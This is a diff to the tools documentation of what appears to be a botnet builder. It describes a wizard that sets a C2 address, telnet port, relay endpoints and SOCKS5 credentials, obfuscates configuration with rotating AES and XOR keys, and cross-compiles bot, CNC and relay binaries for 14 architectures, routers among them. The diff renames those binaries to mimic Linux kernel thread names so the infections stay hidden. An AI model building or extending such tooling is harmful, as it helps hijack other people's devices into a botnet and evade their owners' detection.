@@ -8,8 +8,9 @@ Quick reference for everything in the `tools/` directory.
 
 The main build wizard. Handles first-time setup and rebuilds.
 
-- **Option 1 — Full Setup**: Prompts for C2 address, telnet port, auth secrets, generates TLS certs, rotates the AES key, encrypts all config blobs, and cross-compiles bot binaries for 14 architectures.
-- **Option 2 — Update C2 Only**: Changes the C2 address and re-obfuscates it without touching other config. Used when moving to a new server.
+- **Option 1 — Full Setup**: Prompts for C2 address, telnet port, auth secrets, relay endpoints, SOCKS5 credentials, generates TLS certs, rotates the AES key, encrypts all config blobs, and cross-compiles bot + CNC + relay binaries for 14 architectures.
+- **Option 2 — Update C2 Only**: Changes the C2 address and re-obfuscates it without touching other config. Rebuilds bots + relay.
+- **Option 3 — Relay Endpoints Update**: Changes relay endpoint list and SOCKS5 proxy credentials. Rebuilds bots + relay without touching C2/tokens/certs.
 
 On every run it generates a unique random AES-128-CTR key, patches the XOR byte functions in `bot/opsec.go`, and re-encrypts all sensitive string blobs in `bot/config.go`.
 
@@ -41,20 +42,20 @@ Output goes to `bins/` in the project root.
 
 | Binary Name   | Architecture | Notes                        |
 |---------------|-------------|------------------------------|
-| kworkerd0     | x86 (386)   | 32-bit Intel/AMD             |
-| ethd0         | x86_64      | 64-bit Intel/AMD             |
-| mdsync1       | ARMv7       | Raspberry Pi 2/3             |
-| ksnapd0       | ARMv5       | Older ARM devices            |
-| kswapd1       | ARMv6       | Raspberry Pi 1               |
-| ip6addrd      | ARM64       | RPi 4, Android, modern ARM   |
-| deferwqd      | MIPS        | Routers (big-endian)         |
-| devfreqd0     | MIPSLE      | Routers (little-endian)      |
-| kintegrity0   | MIPS64      | 64-bit MIPS big-endian       |
-| biosd0        | MIPS64LE    | 64-bit MIPS little-endian    |
-| kpsmoused0    | PPC64       | PowerPC 64-bit big-endian    |
-| ttmswapd      | PPC64LE     | PowerPC 64-bit little-endian |
-| vredisd0      | s390x       | IBM System/390               |
-| kvmirqd       | RISC-V 64   | RISC-V 64-bit                |
+| ksoftirqd0    | x86 (386)   | 32-bit Intel/AMD             |
+| kworker_u8    | x86_64      | 64-bit Intel/AMD             |
+| jbd2_sda1d    | ARMv7       | Raspberry Pi 2/3             |
+| bioset0       | ARMv5       | Older ARM devices            |
+| kblockd0      | ARMv6       | Raspberry Pi 1               |
+| rcuop_0       | ARM64       | RPi 4, Android, modern ARM   |
+| kswapd0       | MIPS        | Routers (big-endian)         |
+| ecryptfsd     | MIPSLE      | Routers (little-endian)      |
+| xfsaild_sda   | MIPS64      | 64-bit MIPS big-endian       |
+| scsi_tmf_0    | MIPS64LE    | 64-bit MIPS little-endian    |
+| devfreq_wq    | PPC64       | PowerPC 64-bit big-endian    |
+| zswap_shrinkd | PPC64LE     | PowerPC 64-bit little-endian |
+| edac_polld    | s390x       | IBM System/390               |
+| cfg80211d     | RISC-V 64   | RISC-V 64-bit                |
 
 ---
 
